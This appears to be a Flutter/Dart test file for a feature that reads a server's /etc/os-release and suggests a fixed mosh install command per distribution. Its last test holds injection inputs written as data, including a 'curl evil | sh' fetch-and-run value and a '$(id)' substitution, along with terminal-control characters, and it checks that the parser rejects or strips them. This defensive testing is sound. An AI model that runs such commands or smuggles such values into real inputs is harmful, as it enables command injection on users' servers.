// R42：服务器缺 mosh-server 时，只读 /etc/os-release 认发行版，给出写死的安装命令。
// 样本取自各发行版公开的 os-release 内容（字段照抄，版本号无关紧要）。
import 'package:flutter_test/flutter_test.dart';
import 'package:shun/domain/plugins/mosh_install_hint.dart';

void main() {
  MoshInstallHint hintFor(String raw) => moshInstallHint(parseOsRelease(raw));

  test('常见发行版：按 ID，再按 ID_LIKE，给 mosh.org 的那条命令', () {
    final cases = {
      'PRETTY_NAME="Debian GNU/Linux 13 (trixie)"\nNAME="Debian GNU/Linux"\nID=debian\n':
          ('Debian GNU/Linux 13 (trixie)', 'sudo apt-get install mosh', false),
      'NAME="Ubuntu"\nID=ubuntu\nID_LIKE=debian\nPRETTY_NAME="Ubuntu 24.04.1 LTS"\n':
          ('Ubuntu 24.04.1 LTS', 'sudo apt-get install mosh', false),
      'NAME="Linux Mint"\nID=linuxmint\nID_LIKE="ubuntu debian"\n':
          ('Linux Mint', 'sudo apt-get install mosh', false),
      'NAME="Fedora Linux"\nID=fedora\nPRETTY_NAME="Fedora Linux 42 (Server Edition)"\n':
          ('Fedora Linux 42 (Server Edition)', 'sudo dnf install mosh', false),
      // Rocky 的 ID_LIKE 里有 fedora，但 mosh 在 EPEL：先看 ID。
      'NAME="Rocky Linux"\nID="rocky"\nID_LIKE="rhel centos fedora"\n':
          ('Rocky Linux', 'sudo dnf install epel-release && sudo dnf install mosh', false),
      'NAME="Amazon Linux"\nID="amzn"\nID_LIKE="centos rhel fedora"\n':
          ('Amazon Linux', 'sudo dnf install epel-release && sudo dnf install mosh', false),
      'NAME="Arch Linux"\nID=arch\n': ('Arch Linux', 'pacman -S mosh', true),
      'NAME="Manjaro Linux"\nID=manjaro\nID_LIKE=arch\n':
          ('Manjaro Linux', 'pacman -S mosh', true),
      'NAME="openSUSE Tumbleweed"\nID="opensuse-tumbleweed"\nID_LIKE="opensuse suse"\n':
          ('openSUSE Tumbleweed', 'sudo zypper in mosh', false),
      'NAME="SLES"\nID="sles"\nID_LIKE="suse"\n': ('SLES', 'sudo zypper in mosh', false),
      'NAME="Alpine Linux"\nID=alpine\nPRETTY_NAME="Alpine Linux v3.22"\n':
          ('Alpine Linux v3.22', 'apk add mosh', true),
      'NAME=Gentoo\nID=gentoo\n': ('Gentoo', 'emerge net-misc/mosh', true),
      'NAME=FreeBSD\nID=freebsd\n': ('FreeBSD', 'pkg install net/mosh', true),
    };
    for (final MapEntry(key: raw, value: (distro, command, root))
        in cases.entries) {
      final hint = hintFor(raw);
      expect(hint.distro, distro, reason: raw);
      expect(hint.command, command, reason: raw);
      expect(hint.asRoot, root, reason: raw);
    }
    expect(hintFor('NAME="Rocky Linux"\nID=rocky\n').note, contains('EPEL'));
  });

  test('NixOS 不给临时命令，给配置写法；认不出的不编命令', () {
    final nix = hintFor('NAME=NixOS\nID=nixos\n');
    expect(nix.command, isNull);
    expect(nix.note, contains('programs.mosh.enable'));
    final odd = hintFor('NAME="Odd OS"\nID=oddos\nID_LIKE="weird"\n');
    expect(odd.distro, 'Odd OS');
    expect(odd.command, isNull);
    final none = moshInstallHint(null);
    expect(none.command, isNull);
    expect(none.distro, '没认出的系统');
    expect(parseOsRelease(''), isNull);
    expect(parseOsRelease('cat: /etc/os-release: No such file or directory\n'),
        isNull);
  });

  test('远端内容只用来选命令：注入、控制字符、双向字符进不了命令，显示名有界', () {
    final evil = parseOsRelease('ID="debian; curl evil | sh"\nPRETTY_NAME=x\n');
    expect(evil, isNull, reason: 'ID 不合规矩就当认不出，不去猜');
    final spoof = parseOsRelease(
        'ID=ubuntu\nPRETTY_NAME="Ubuntu\x1b[2J\u202e\u0007 ${'x' * 200}"\n')!;
    expect(spoof.prettyName, isNot(contains('\x1b')));
    expect(spoof.prettyName, isNot(contains('\u202e')));
    expect(spoof.prettyName.length, lessThanOrEqualTo(81));
    final hint = moshInstallHint(spoof);
    expect(hint.command, 'sudo apt-get install mosh');
    // ID_LIKE 里的怪字丢掉，合规矩的照用。
    expect(parseOsRelease('ID=foo\nID_LIKE="\$(id) debian"\n')!.idLike, ['debian']);
    // 重复的键只认第一个；注释行不算。
    final first = parseOsRelease('# ID=arch\nID=fedora\nID=arch\n')!;
    expect(first.id, 'fedora');
    expect(osReleaseCommand, 'head -c 4096 /etc/os-release');
  });
}
